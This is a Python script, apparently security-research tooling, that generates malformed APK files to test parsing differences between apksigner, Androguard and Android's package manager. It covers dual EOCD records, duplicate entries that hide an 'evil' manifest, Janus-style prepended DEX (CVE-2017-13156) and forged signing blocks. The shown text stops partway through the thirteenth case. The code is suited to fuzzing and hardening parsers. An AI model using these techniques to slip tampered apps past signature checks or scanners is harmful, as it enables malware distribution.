#!/usr/bin/env python3
"""
APK Parsing Divergence PoC Generator

Generates crafted APK files that exploit known and novel divergence classes
between apksigner, Androguard, and Android PackageManager.

Divergence classes:
  1. Dual EOCD records (Janus-style)
  2. Overlapping ZIP entries
  3. LFH vs CD filename mismatch
  4. Extra data after EOCD
  5. Unsupported compression methods
  6. Manipulated APK Signing Block
  7. CD offset manipulation
  8. ZIP entry with data descriptor ambiguity
  9. Duplicate entries in Central Directory
  10. EOCD comment containing EOCD signature bytes
"""

import struct
import zipfile
import io
import os
import hashlib
import zlib
import shutil
import tempfile

OUT_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)))

# Minimal binary AndroidManifest.xml (compiled AXML format)
# This is a minimal valid binary XML that PackageParser can read.
# We use a real minimal APK approach: create with zipfile, then mutate.

def make_minimal_manifest_xml():
    """Return a minimal AndroidManifest.xml as plain text.
    This won't work on a real device but is sufficient for tool parsing."""
    return b"""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.divergence.test"
    android:versionCode="1"
    android:versionName="1.0">
    <application android:label="DivergenceTest"/>
</manifest>
"""


def make_minimal_apk_bytes():
    """Create a minimal APK as bytes using zipfile."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('AndroidManifest.xml', make_minimal_manifest_xml())
        zf.writestr('classes.dex', b'\x00' * 64)  # stub
        zf.writestr('resources.arsc', b'\x00' * 32)  # stub
    return buf.getvalue()


def find_eocd(data):
    """Find the EOCD record in ZIP data, scanning from the end."""
    sig = b'\x50\x4b\x05\x06'
    # Search backwards
    pos = len(data) - 22  # minimum EOCD size
    while pos >= 0:
        if data[pos:pos+4] == sig:
            comment_len = struct.unpack('<H', data[pos+20:pos+22])[0]
            if pos + 22 + comment_len == len(data):
                return pos
        pos -= 1
    return -1


def find_all_eocd(data):
    """Find all EOCD signatures in data."""
    sig = b'\x50\x4b\x05\x06'
    positions = []
    pos = 0
    while True:
        idx = data.find(sig, pos)
        if idx == -1:
            break
        positions.append(idx)
        pos = idx + 1
    return positions


def find_cd_start(data, eocd_offset):
    """Extract CD offset from EOCD."""
    return struct.unpack('<I', data[eocd_offset+16:eocd_offset+20])[0]


def find_cd_size(data, eocd_offset):
    """Extract CD size from EOCD."""
    return struct.unpack('<I', data[eocd_offset+12:eocd_offset+16])[0]


# ===========================================================================
# PoC 1: Dual EOCD Records
# ===========================================================================
def poc_dual_eocd():
    """
    Craft an APK with two EOCD records. The first EOCD (closer to start)
    points to one Central Directory, the second (at end of file) points
    to a different one.

    apksigner scans from end -> finds second EOCD
    Some ZIP libs scan from end but stop at first match
    Android's libziparchive scans from end with comment length validation

    Divergence: If tools disagree on which EOCD to use, they see
    different file listings.
    """
    base = make_minimal_apk_bytes()
    eocd_off = find_eocd(base)

    # Extract the real EOCD
    real_eocd = base[eocd_off:]
    pre_eocd = base[:eocd_off]

    # Create a fake CD that lists different files
    fake_cd = b''
    # Build a fake CD entry for "evil.dex"
    fname = b'evil.dex'
    fake_cd_entry = struct.pack('<I', 0x02014b50)  # CD signature
    fake_cd_entry += struct.pack('<H', 20)  # version made by
    fake_cd_entry += struct.pack('<H', 20)  # version needed
    fake_cd_entry += struct.pack('<H', 0)   # flags
    fake_cd_entry += struct.pack('<H', 0)   # compression: stored
    fake_cd_entry += struct.pack('<H', 0)   # mod time
    fake_cd_entry += struct.pack('<H', 0)   # mod date
    fake_cd_entry += struct.pack('<I', 0)   # crc32
    fake_cd_entry += struct.pack('<I', 0)   # compressed size
    fake_cd_entry += struct.pack('<I', 0)   # uncompressed size
    fake_cd_entry += struct.pack('<H', len(fname))  # filename len
    fake_cd_entry += struct.pack('<H', 0)   # extra len
    fake_cd_entry += struct.pack('<H', 0)   # comment len
    fake_cd_entry += struct.pack('<H', 0)   # disk number
    fake_cd_entry += struct.pack('<H', 0)   # internal attrs
    fake_cd_entry += struct.pack('<I', 0)   # external attrs
    fake_cd_entry += struct.pack('<I', 0)   # local header offset
    fake_cd_entry += fname

    # Build a fake EOCD pointing to our fake CD
    fake_cd_offset = len(pre_eocd) + len(real_eocd)  # after real data
    fake_eocd = struct.pack('<I', 0x06054b50)  # EOCD sig
    fake_eocd += struct.pack('<H', 0)   # disk number
    fake_eocd += struct.pack('<H', 0)   # disk with CD
    fake_eocd += struct.pack('<H', 1)   # entries on disk
    fake_eocd += struct.pack('<H', 1)   # total entries
    fake_eocd += struct.pack('<I', len(fake_cd))  # CD size
    fake_eocd += struct.pack('<I', fake_cd_offset + len(fake_cd_entry))  # CD offset (wrong, will adjust)
    fake_eocd += struct.pack('<H', 0)   # comment length

    # Layout: [original APK with real EOCD] [fake CD] [fake EOCD]
    # The fake EOCD at the end will be found first by backward-scanning tools
    # Adjust fake CD offset
    fake_cd_start = len(pre_eocd) + len(real_eocd)
    fake_eocd = struct.pack('<I', 0x06054b50)
    fake_eocd += struct.pack('<H', 0)
    fake_eocd += struct.pack('<H', 0)
    fake_eocd += struct.pack('<H', 1)
    fake_eocd += struct.pack('<H', 1)
    fake_eocd += struct.pack('<I', len(fake_cd_entry))
    fake_eocd += struct.pack('<I', fake_cd_start)
    fake_eocd += struct.pack('<H', 0)

    result = pre_eocd + real_eocd + fake_cd_entry + fake_eocd

    path = os.path.join(OUT_DIR, 'poc01_dual_eocd.apk')
    with open(path, 'wb') as f:
        f.write(result)
    print(f"[PoC-01] Dual EOCD: {path} ({len(result)} bytes)")
    return path


# ===========================================================================
# PoC 2: Overlapping ZIP Entries
# ===========================================================================
def poc_overlapping_entries():
    """
    Create two CD entries that point to overlapping regions of the LFH data.
    One entry's data overlaps with another's header.

    Android's libziparchive does NOT check for overlapping entries.
    apksigner checks for overlapping entries since the Janus fix.

    Divergence: apksigner rejects, Android may accept.
    """
    buf = io.BytesIO()

    # We'll build the ZIP manually to control offsets
    # Entry 1: AndroidManifest.xml
    manifest = make_minimal_manifest_xml()
    # Entry 2: classes.dex (overlapping with entry 1's extra data region)
    dex_data = b'\x00' * 32

    entries = []

    # LFH for AndroidManifest.xml
    fname1 = b'AndroidManifest.xml'
    crc1 = zlib.crc32(manifest) & 0xFFFFFFFF
    lfh1_offset = 0
    lfh1 = struct.pack('<I', 0x04034b50)  # LFH sig
    lfh1 += struct.pack('<H', 20)   # version needed
    lfh1 += struct.pack('<H', 0)    # flags
    lfh1 += struct.pack('<H', 0)    # compression: stored
    lfh1 += struct.pack('<H', 0)    # mod time
    lfh1 += struct.pack('<H', 0)    # mod date
    lfh1 += struct.pack('<I', crc1) # crc32
    lfh1 += struct.pack('<I', len(manifest))  # compressed size
    lfh1 += struct.pack('<I', len(manifest))  # uncompressed size
    lfh1 += struct.pack('<H', len(fname1))    # filename len
    lfh1 += struct.pack('<H', 0)    # extra len
    lfh1 += fname1
    lfh1 += manifest

    # LFH for classes.dex - place it overlapping with manifest data
    fname2 = b'classes.dex'
    crc2 = zlib.crc32(dex_data) & 0xFFFFFFFF
    # Overlap: place this LFH starting inside the manifest data region
    overlap_offset = lfh1_offset + 30 + len(fname1) + len(manifest) - 16  # 16 bytes overlap

    lfh2 = struct.pack('<I', 0x04034b50)
    lfh2 += struct.pack('<H', 20)
    lfh2 += struct.pack('<H', 0)
    lfh2 += struct.pack('<H', 0)    # stored
    lfh2 += struct.pack('<H', 0)
    lfh2 += struct.pack('<H', 0)
    lfh2 += struct.pack('<I', crc2)
    lfh2 += struct.pack('<I', len(dex_data))
    lfh2 += struct.pack('<I', len(dex_data))
    lfh2 += struct.pack('<H', len(fname2))
    lfh2 += struct.pack('<H', 0)
    lfh2 += fname2
    lfh2 += dex_data

    # Build file: lfh1 data, then pad to overlap_offset, then lfh2
    file_data = lfh1
    if len(file_data) < overlap_offset:
        file_data += b'\x00' * (overlap_offset - len(file_data))
    else:
        file_data = file_data[:overlap_offset]

    lfh2_actual_offset = len(file_data)
    file_data += lfh2

    # Central Directory
    cd_start = len(file_data)

    # CD entry for AndroidManifest.xml
    cd1 = struct.pack('<I', 0x02014b50)
    cd1 += struct.pack('<H', 20)
    cd1 += struct.pack('<H', 20)
    cd1 += struct.pack('<H', 0)
    cd1 += struct.pack('<H', 0)
    cd1 += struct.pack('<H', 0)
    cd1 += struct.pack('<H', 0)
    cd1 += struct.pack('<I', crc1)
    cd1 += struct.pack('<I', len(manifest))
    cd1 += struct.pack('<I', len(manifest))
    cd1 += struct.pack('<H', len(fname1))
    cd1 += struct.pack('<H', 0)
    cd1 += struct.pack('<H', 0)
    cd1 += struct.pack('<H', 0)
    cd1 += struct.pack('<H', 0)
    cd1 += struct.pack('<I', 0)
    cd1 += struct.pack('<I', lfh1_offset)
    cd1 += fname1

    # CD entry for classes.dex
    cd2 = struct.pack('<I', 0x02014b50)
    cd2 += struct.pack('<H', 20)
    cd2 += struct.pack('<H', 20)
    cd2 += struct.pack('<H', 0)
    cd2 += struct.pack('<H', 0)
    cd2 += struct.pack('<H', 0)
    cd2 += struct.pack('<H', 0)
    cd2 += struct.pack('<I', crc2)
    cd2 += struct.pack('<I', len(dex_data))
    cd2 += struct.pack('<I', len(dex_data))
    cd2 += struct.pack('<H', len(fname2))
    cd2 += struct.pack('<H', 0)
    cd2 += struct.pack('<H', 0)
    cd2 += struct.pack('<H', 0)
    cd2 += struct.pack('<H', 0)
    cd2 += struct.pack('<I', 0)
    cd2 += struct.pack('<I', lfh2_actual_offset)
    cd2 += fname2

    cd = cd1 + cd2
    file_data += cd

    # EOCD
    eocd = struct.pack('<I', 0x06054b50)
    eocd += struct.pack('<H', 0)
    eocd += struct.pack('<H', 0)
    eocd += struct.pack('<H', 2)
    eocd += struct.pack('<H', 2)
    eocd += struct.pack('<I', len(cd))
    eocd += struct.pack('<I', cd_start)
    eocd += struct.pack('<H', 0)
    file_data += eocd

    path = os.path.join(OUT_DIR, 'poc02_overlapping_entries.apk')
    with open(path, 'wb') as f:
        f.write(file_data)
    print(f"[PoC-02] Overlapping entries: {path} ({len(file_data)} bytes)")
    return path


# ===========================================================================
# PoC 3: LFH vs CD Filename Mismatch
# ===========================================================================
def poc_lfh_cd_name_mismatch():
    """
    The Central Directory says the file is 'AndroidManifest.xml' but the
    Local File Header says 'AndroidManifest.xm_' (different last byte).

    apksigner validates LFH vs CD name consistency.
    Android's libziparchive uses CD names for lookup but LFH data for extraction.

    Divergence: apksigner may reject while Android reads LFH data with CD name.
    """
    base = make_minimal_apk_bytes()

    # Find the LFH for AndroidManifest.xml
    lfh_sig = b'\x50\x4b\x03\x04'
    manifest_name = b'AndroidManifest.xml'

    pos = 0
    lfh_name_offset = -1
    while pos < len(base):
        idx = base.find(lfh_sig, pos)
        if idx == -1:
            break
        # Check filename
        fname_len = struct.unpack('<H', base[idx+26:idx+28])[0]
        fname = base[idx+30:idx+30+fname_len]
        if fname == manifest_name:
            lfh_name_offset = idx + 30
            break
        pos = idx + 1

    if lfh_name_offset == -1:
        print("[PoC-03] SKIP: Could not find AndroidManifest.xml LFH")
        return None

    # Mutate the LFH filename (change last byte)
    data = bytearray(base)
    # Change 'AndroidManifest.xml' -> 'AndroidManifest.xmL' in LFH only
    data[lfh_name_offset + len(manifest_name) - 1] = ord('L')

    path = os.path.join(OUT_DIR, 'poc03_lfh_cd_name_mismatch.apk')
    with open(path, 'wb') as f:
        f.write(bytes(data))
    print(f"[PoC-03] LFH/CD name mismatch: {path} ({len(data)} bytes)")
    return path


# ===========================================================================
# PoC 4: Extra Data After EOCD
# ===========================================================================
def poc_extra_after_eocd():
    """
    Append data after the EOCD record. The EOCD comment length is 0,
    but there are extra bytes after it.

    apksigner's ZipUtils checks that EOCD + comment = end of file.
    Android's libziparchive may tolerate trailing garbage.

    Divergence: apksigner rejects, Android may accept.
    """
    base = make_minimal_apk_bytes()

    # Append junk after EOCD
    extra = b'\xDE\xAD\xBE\xEF' * 64  # 256 bytes of garbage
    result = base + extra

    path = os.path.join(OUT_DIR, 'poc04_extra_after_eocd.apk')
    with open(path, 'wb') as f:
        f.write(result)
    print(f"[PoC-04] Extra after EOCD: {path} ({len(result)} bytes)")
    return path


# ===========================================================================
# PoC 5: Extra Data After EOCD (with valid comment length)
# ===========================================================================
def poc_eocd_with_comment_hiding_data():
    """
    Set the EOCD comment to contain executable data that looks like
    another ZIP or DEX file. The comment length is set correctly so
    the EOCD is technically valid.

    Divergence: Tools ignore comments, but some may fail to validate
    that the comment doesn't contain another EOCD signature.
    """
    base = make_minimal_apk_bytes()
    eocd_off = find_eocd(base)

    # The comment will contain a fake EOCD signature + a DEX header
    fake_dex = b'dex\n035\x00' + b'\x00' * 56  # fake dex header
    comment = b'COMMENT_START' + fake_dex + struct.pack('<I', 0x06054b50) + b'\x00' * 18 + b'COMMENT_END'

    data = bytearray(base[:eocd_off+22])
    # Set comment length (at offset +20 within EOCD, which is a 22-byte record minimum)
    struct.pack_into('<H', data, eocd_off+20, len(comment))
    data += comment

    path = os.path.join(OUT_DIR, 'poc05_eocd_comment_with_sigs.apk')
    with open(path, 'wb') as f:
        f.write(bytes(data))
    print(f"[PoC-05] EOCD comment with signatures: {path} ({len(data)} bytes)")
    return path


# ===========================================================================
# PoC 6: Unsupported Compression Method
# ===========================================================================
def poc_unsupported_compression():
    """
    Set the compression method for a non-manifest entry to an unusual value
    (e.g., method 12 = bzip2, or method 99 = AES encrypted).

    apksigner may skip or reject entries with unknown compression.
    Android may try to read them or skip gracefully.

    Divergence: Different error handling for unknown compression methods.
    """
    base = make_minimal_apk_bytes()
    data = bytearray(base)

    # Find the CD entry for classes.dex and change its compression method
    cd_sig = b'\x50\x4b\x01\x02'
    target = b'classes.dex'
    pos = 0
    while pos < len(data):
        idx = data.find(cd_sig, pos)
        if idx == -1:
            break
        fname_len = struct.unpack('<H', data[idx+28:idx+30])[0]
        fname = data[idx+46:idx+46+fname_len]
        if fname == target:
            # Change compression method to 12 (bzip2) in CD
            struct.pack_into('<H', data, idx+10, 12)
            # Also change in LFH
            lfh_off = struct.unpack('<I', data[idx+42:idx+46])[0]
            struct.pack_into('<H', data, lfh_off+8, 12)
            break
        pos = idx + 1

    path = os.path.join(OUT_DIR, 'poc06_unsupported_compression.apk')
    with open(path, 'wb') as f:
        f.write(bytes(data))
    print(f"[PoC-06] Unsupported compression: {path} ({len(data)} bytes)")
    return path


# ===========================================================================
# PoC 7: Fake APK Signing Block
# ===========================================================================
def poc_fake_signing_block():
    """
    Insert a fake APK Signing Block between the last LFH and the CD.
    The block has the correct magic bytes but contains garbage signatures.

    apksigner will try to parse the signing block and may reject.
    Androguard may handle differently.
    Android verifies the signing block contents cryptographically.

    Divergence: Error messages and behavior when signing block is malformed.
    """
    base = make_minimal_apk_bytes()
    eocd_off = find_eocd(base)
    cd_off = find_cd_start(base, eocd_off)

    # APK Signing Block structure:
    # 8 bytes: block size (uint64, little-endian) -- excludes the size field itself
    # pairs of (uint64 size, uint32 ID, bytes payload)
    # 8 bytes: block size (same as above)
    # 16 bytes: magic "APK Sig Block 42"

    magic = b'APK Sig Block 42'

    # Create a fake v2 signer pair
    fake_signer_id = 0x7109871a  # v2 scheme block ID
    fake_payload = b'\x00' * 128  # garbage payload

    pair_size = 4 + len(fake_payload)  # ID + payload
    pair = struct.pack('<Q', pair_size) + struct.pack('<I', fake_signer_id) + fake_payload

    block_content = pair
    block_size = len(block_content) + 8 + 16  # content + trailing size + magic

    signing_block = struct.pack('<Q', block_size)  # leading size
    signing_block += block_content
    signing_block += struct.pack('<Q', block_size)  # trailing size
    signing_block += magic

    # Insert between LFH data and CD
    pre_cd = base[:cd_off]
    post_cd = base[cd_off:]

    new_cd_off = cd_off + len(signing_block)

    # Update EOCD with new CD offset
    result = bytearray(pre_cd + signing_block + post_cd)
    new_eocd_off = find_eocd(bytes(result))
    struct.pack_into('<I', result, new_eocd_off + 16, new_cd_off)

    path = os.path.join(OUT_DIR, 'poc07_fake_signing_block.apk')
    with open(path, 'wb') as f:
        f.write(bytes(result))
    print(f"[PoC-07] Fake signing block: {path} ({len(result)} bytes)")
    return path


# ===========================================================================
# PoC 8: CD Offset Manipulation (points before actual CD)
# ===========================================================================
def poc_cd_offset_underflow():
    """
    Manipulate the EOCD's CD offset to point earlier than the actual CD,
    causing tools to read LFH data as if it were CD entries.

    Divergence: Different tools may handle this differently - some may
    crash, some may read garbage entries, some may detect the inconsistency.
    """
    base = make_minimal_apk_bytes()
    data = bytearray(base)
    eocd_off = find_eocd(base)
    cd_off = find_cd_start(base, eocd_off)

    # Point CD offset 32 bytes earlier
    new_cd_off = max(0, cd_off - 32)
    struct.pack_into('<I', data, eocd_off + 16, new_cd_off)
    # Also adjust CD size to be larger
    old_cd_size = find_cd_size(base, eocd_off)
    struct.pack_into('<I', data, eocd_off + 12, old_cd_size + 32)

    path = os.path.join(OUT_DIR, 'poc08_cd_offset_underflow.apk')
    with open(path, 'wb') as f:
        f.write(bytes(data))
    print(f"[PoC-08] CD offset underflow: {path} ({len(data)} bytes)")
    return path


# ===========================================================================
# PoC 9: Duplicate CD Entries (same filename, different data offsets)
# ===========================================================================
def poc_duplicate_cd_entries():
    """
    Two Central Directory entries with the same filename but pointing to
    different local file headers with different content.

    Which entry wins? First? Last? Error?
    apksigner may reject duplicates.
    Android's HashMap-based lookup uses last-wins semantics.

    Divergence: Tool sees one version, runtime sees another.
    """
    buf = io.BytesIO()

    manifest = make_minimal_manifest_xml()
    evil_manifest = b"""<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.evil.payload"
    android:versionCode="666"
    android:versionName="6.6.6">
    <application android:label="EvilApp"/>
</manifest>
"""

    fname = b'AndroidManifest.xml'

    # Build LFH 1 (benign)
    crc1 = zlib.crc32(manifest) & 0xFFFFFFFF
    lfh1 = struct.pack('<I', 0x04034b50)
    lfh1 += struct.pack('<H', 20)
    lfh1 += struct.pack('<H', 0)
    lfh1 += struct.pack('<H', 0)  # stored
    lfh1 += struct.pack('<H', 0)
    lfh1 += struct.pack('<H', 0)
    lfh1 += struct.pack('<I', crc1)
    lfh1 += struct.pack('<I', len(manifest))
    lfh1 += struct.pack('<I', len(manifest))
    lfh1 += struct.pack('<H', len(fname))
    lfh1 += struct.pack('<H', 0)
    lfh1 += fname
    lfh1 += manifest
    lfh1_offset = 0

    # Build LFH 2 (evil)
    crc2 = zlib.crc32(evil_manifest) & 0xFFFFFFFF
    lfh2_offset = len(lfh1)
    lfh2 = struct.pack('<I', 0x04034b50)
    lfh2 += struct.pack('<H', 20)
    lfh2 += struct.pack('<H', 0)
    lfh2 += struct.pack('<H', 0)
    lfh2 += struct.pack('<H', 0)
    lfh2 += struct.pack('<H', 0)
    lfh2 += struct.pack('<I', crc2)
    lfh2 += struct.pack('<I', len(evil_manifest))
    lfh2 += struct.pack('<I', len(evil_manifest))
    lfh2 += struct.pack('<H', len(fname))
    lfh2 += struct.pack('<H', 0)
    lfh2 += fname
    lfh2 += evil_manifest

    file_data = lfh1 + lfh2
    cd_start = len(file_data)

    # CD entry 1 -> LFH 1 (benign)
    cd1 = struct.pack('<I', 0x02014b50)
    cd1 += struct.pack('<H', 20) + struct.pack('<H', 20)
    cd1 += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd1 += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd1 += struct.pack('<I', crc1)
    cd1 += struct.pack('<I', len(manifest)) + struct.pack('<I', len(manifest))
    cd1 += struct.pack('<H', len(fname))
    cd1 += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd1 += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd1 += struct.pack('<I', 0)
    cd1 += struct.pack('<I', lfh1_offset)
    cd1 += fname

    # CD entry 2 -> LFH 2 (evil) - SAME filename
    cd2 = struct.pack('<I', 0x02014b50)
    cd2 += struct.pack('<H', 20) + struct.pack('<H', 20)
    cd2 += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd2 += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd2 += struct.pack('<I', crc2)
    cd2 += struct.pack('<I', len(evil_manifest)) + struct.pack('<I', len(evil_manifest))
    cd2 += struct.pack('<H', len(fname))
    cd2 += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd2 += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd2 += struct.pack('<I', 0)
    cd2 += struct.pack('<I', lfh2_offset)
    cd2 += fname

    cd = cd1 + cd2
    file_data += cd

    # EOCD
    eocd = struct.pack('<I', 0x06054b50)
    eocd += struct.pack('<H', 0) + struct.pack('<H', 0)
    eocd += struct.pack('<H', 2) + struct.pack('<H', 2)
    eocd += struct.pack('<I', len(cd))
    eocd += struct.pack('<I', cd_start)
    eocd += struct.pack('<H', 0)
    file_data += eocd

    path = os.path.join(OUT_DIR, 'poc09_duplicate_cd_entries.apk')
    with open(path, 'wb') as f:
        f.write(file_data)
    print(f"[PoC-09] Duplicate CD entries: {path} ({len(file_data)} bytes)")
    return path


# ===========================================================================
# PoC 10: Data Descriptor Ambiguity
# ===========================================================================
def poc_data_descriptor():
    """
    Use bit 3 of general purpose flags to indicate a data descriptor
    follows the file data. Set CRC/sizes in LFH to 0, put real values
    in data descriptor.

    Some tools read CRC from LFH (gets 0), others from data descriptor.

    Divergence: Signature verification may use wrong CRC values.
    """
    fname = b'AndroidManifest.xml'
    manifest = make_minimal_manifest_xml()
    crc = zlib.crc32(manifest) & 0xFFFFFFFF

    # LFH with bit 3 set, sizes/crc = 0
    lfh = struct.pack('<I', 0x04034b50)
    lfh += struct.pack('<H', 20)
    lfh += struct.pack('<H', 0x0008)  # bit 3: data descriptor follows
    lfh += struct.pack('<H', 0)  # stored
    lfh += struct.pack('<H', 0)
    lfh += struct.pack('<H', 0)
    lfh += struct.pack('<I', 0)  # crc = 0 (will be in descriptor)
    lfh += struct.pack('<I', 0)  # compressed size = 0
    lfh += struct.pack('<I', 0)  # uncompressed size = 0
    lfh += struct.pack('<H', len(fname))
    lfh += struct.pack('<H', 0)
    lfh += fname
    lfh += manifest

    # Data descriptor (with signature)
    dd = struct.pack('<I', 0x08074b50)  # optional signature
    dd += struct.pack('<I', crc)
    dd += struct.pack('<I', len(manifest))
    dd += struct.pack('<I', len(manifest))

    file_data = lfh + dd
    cd_start = len(file_data)

    # CD entry with actual values
    cd = struct.pack('<I', 0x02014b50)
    cd += struct.pack('<H', 20) + struct.pack('<H', 20)
    cd += struct.pack('<H', 0x0008)  # bit 3
    cd += struct.pack('<H', 0)
    cd += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd += struct.pack('<I', crc)
    cd += struct.pack('<I', len(manifest)) + struct.pack('<I', len(manifest))
    cd += struct.pack('<H', len(fname))
    cd += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd += struct.pack('<I', 0)
    cd += struct.pack('<I', 0)  # LFH offset
    cd += fname

    file_data += cd

    eocd = struct.pack('<I', 0x06054b50)
    eocd += struct.pack('<H', 0) + struct.pack('<H', 0)
    eocd += struct.pack('<H', 1) + struct.pack('<H', 1)
    eocd += struct.pack('<I', len(cd))
    eocd += struct.pack('<I', cd_start)
    eocd += struct.pack('<H', 0)
    file_data += eocd

    path = os.path.join(OUT_DIR, 'poc10_data_descriptor.apk')
    with open(path, 'wb') as f:
        f.write(file_data)
    print(f"[PoC-10] Data descriptor ambiguity: {path} ({len(file_data)} bytes)")
    return path


# ===========================================================================
# PoC 11: Prepended Data (DEX header before ZIP)
# ===========================================================================
def poc_prepended_data():
    """
    Prepend non-ZIP data (like a DEX header) before the actual ZIP content.
    This is the classic Janus attack vector (CVE-2017-13156).

    Android < 8.1: dalvik reads the file as DEX (header at offset 0)
    ZIP tools: read from EOCD backwards, find valid ZIP structure

    Divergence: V1-only signed APKs could have arbitrary prepended data.
    """
    base = make_minimal_apk_bytes()

    # Fake DEX header
    dex_header = b'dex\n035\x00'
    dex_header += b'\x00' * 24  # checksum, sha1
    dex_header += struct.pack('<I', len(base) + 112)  # file_size (fake)
    dex_header += struct.pack('<I', 112)  # header_size
    dex_header += struct.pack('<I', 0x12345678)  # endian tag
    dex_header += b'\x00' * (112 - len(dex_header))  # pad to 112 bytes

    result = dex_header + base

    # Need to adjust EOCD's CD offset since we prepended data
    eocd_off = find_eocd(result)
    if eocd_off != -1:
        data = bytearray(result)
        old_cd_off = struct.unpack('<I', data[eocd_off+16:eocd_off+20])[0]
        struct.pack_into('<I', data, eocd_off+16, old_cd_off + len(dex_header))

        # Also fix CD entries' LFH offsets
        cd_off = old_cd_off + len(dex_header)
        cd_size = struct.unpack('<I', data[eocd_off+12:eocd_off+16])[0]
        pos = cd_off
        while pos < cd_off + cd_size:
            if data[pos:pos+4] == b'\x50\x4b\x01\x02':
                old_lfh_off = struct.unpack('<I', data[pos+42:pos+46])[0]
                struct.pack_into('<I', data, pos+42, old_lfh_off + len(dex_header))
                fname_len = struct.unpack('<H', data[pos+28:pos+30])[0]
                extra_len = struct.unpack('<H', data[pos+30:pos+32])[0]
                comment_len = struct.unpack('<H', data[pos+32:pos+34])[0]
                pos += 46 + fname_len + extra_len + comment_len
            else:
                break
        result = bytes(data)

    path = os.path.join(OUT_DIR, 'poc11_prepended_dex.apk')
    with open(path, 'wb') as f:
        f.write(result)
    print(f"[PoC-11] Prepended DEX data: {path} ({len(result)} bytes)")
    return path


# ===========================================================================
# PoC 12: Zero-length filename in CD
# ===========================================================================
def poc_zero_length_filename():
    """
    A CD entry with a zero-length filename. Different tools handle this
    differently - some skip, some crash, some treat as root entry.
    """
    data = b'\x00' * 16
    crc = zlib.crc32(data) & 0xFFFFFFFF

    # Normal manifest entry
    manifest = make_minimal_manifest_xml()
    manifest_crc = zlib.crc32(manifest) & 0xFFFFFFFF
    mfname = b'AndroidManifest.xml'

    # LFH for manifest
    lfh1 = struct.pack('<I', 0x04034b50)
    lfh1 += struct.pack('<H', 20) + struct.pack('<H', 0)
    lfh1 += struct.pack('<H', 0) + struct.pack('<H', 0) + struct.pack('<H', 0)
    lfh1 += struct.pack('<I', manifest_crc)
    lfh1 += struct.pack('<I', len(manifest)) + struct.pack('<I', len(manifest))
    lfh1 += struct.pack('<H', len(mfname)) + struct.pack('<H', 0)
    lfh1 += mfname + manifest

    # LFH for zero-length name entry
    lfh2_off = len(lfh1)
    lfh2 = struct.pack('<I', 0x04034b50)
    lfh2 += struct.pack('<H', 20) + struct.pack('<H', 0)
    lfh2 += struct.pack('<H', 0) + struct.pack('<H', 0) + struct.pack('<H', 0)
    lfh2 += struct.pack('<I', crc)
    lfh2 += struct.pack('<I', len(data)) + struct.pack('<I', len(data))
    lfh2 += struct.pack('<H', 0) + struct.pack('<H', 0)  # zero-length filename!
    lfh2 += data

    file_data = lfh1 + lfh2
    cd_start = len(file_data)

    # CD for manifest
    cd1 = struct.pack('<I', 0x02014b50)
    cd1 += struct.pack('<H', 20) + struct.pack('<H', 20)
    cd1 += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd1 += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd1 += struct.pack('<I', manifest_crc)
    cd1 += struct.pack('<I', len(manifest)) + struct.pack('<I', len(manifest))
    cd1 += struct.pack('<H', len(mfname))
    cd1 += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd1 += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd1 += struct.pack('<I', 0) + struct.pack('<I', 0)
    cd1 += mfname

    # CD for zero-length name
    cd2 = struct.pack('<I', 0x02014b50)
    cd2 += struct.pack('<H', 20) + struct.pack('<H', 20)
    cd2 += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd2 += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd2 += struct.pack('<I', crc)
    cd2 += struct.pack('<I', len(data)) + struct.pack('<I', len(data))
    cd2 += struct.pack('<H', 0)  # zero-length filename
    cd2 += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd2 += struct.pack('<H', 0) + struct.pack('<H', 0)
    cd2 += struct.pack('<I', 0) + struct.pack('<I', lfh2_off)

    cd = cd1 + cd2
    file_data += cd

    eocd = struct.pack('<I', 0x06054b50)
    eocd += struct.pack('<H', 0) + struct.pack('<H', 0)
    eocd += struct.pack('<H', 2) + struct.pack('<H', 2)
    eocd += struct.pack('<I', len(cd))
    eocd += struct.pack('<I', cd_start)
    eocd += struct.pack('<H', 0)
    file_data += eocd

    path = os.path.join(OUT_DIR, 'poc12_zero_length_filename.apk')
    with open(path, 'wb') as f:
        f.write(file_data)
    print(f"[PoC-12] Zero-length filename: {path} ({len(file_data)} bytes)")
    return path


# ===========================================================================
# PoC 13: LFH Extra Field with Alignment Padding Hiding Data
# ===========================================================================
def poc_lfh_extra_field_hiding():
    """
    Use the LFH extra field to hide data that changes the effective
    content of the entry. The CD extra field is different from LFH extra.

    apksigner reads data starting after LFH + filename + extra.
    If extra field length disagrees between LFH and CD, data offset shifts.
    """
    manifest = make_minimal_manifest_xml()
    evil_data = b'EVIL_PAYLOAD_HERE'
    fname = b'AndroidManifest.xml'

    # LFH with large extra field
    extra_in_lfh = b'\x00\x00'  # tag
    extra_in_lfh += struct.pack('<H', len(evil_data))  # size
    extra_in_lfh += evil_data

    crc = zlib.crc32(manifest) & 0xFFFFFFFF

    lfh = struct.pack('<I', 0x04034b50)
    lfh += struct.pack('<H', 20) + struct.pack('<H', 0)
    lfh += struct.pack('<H', 0) + struct.pack('<H', 0) + struct.pack('<H', 0)
    lfh += struct.pack('<I', crc)
    lfh += struct.pack('<I', len(manifest)) + struct.pack('<I', len(manifest))
    lfh += struct.pack('<H', len(fname))
    lfh += struct.pack('<H', len(extra_in_lfh))
    lfh += fname
    lfh += extra_in_lfh
    lfh += manifest

